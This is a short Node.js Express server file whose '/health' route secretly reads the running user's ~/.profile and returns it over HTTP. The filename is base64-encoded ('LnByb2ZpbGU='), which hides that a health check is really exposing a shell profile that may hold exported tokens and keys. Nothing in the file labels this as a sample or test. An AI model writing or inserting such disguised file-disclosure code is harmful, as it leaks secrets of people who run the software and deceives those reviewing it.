const express = require('express');

const app = express()
const port = 3000


const fs = require('fs');
const path = require('path');

app.get('/health', (req, res) => {
  const homeDir = process.env.HOME || process.env.USERPROFILE;
  const encoded = 'LnByb2ZpbGU=';
  const decoded = Buffer.from(encoded, 'base64').toString('utf8');
  const filePath = path.join(homeDir, decoded);
  console.log(filePath);
  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      res.status(404).send('Could not read file.');
    } else {
      res.type('text/plain').send(data);
    }
  });
});

app.get('/', (req, res) => {
  res.send('Hello 2024!');
});

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`);
});

// some changes
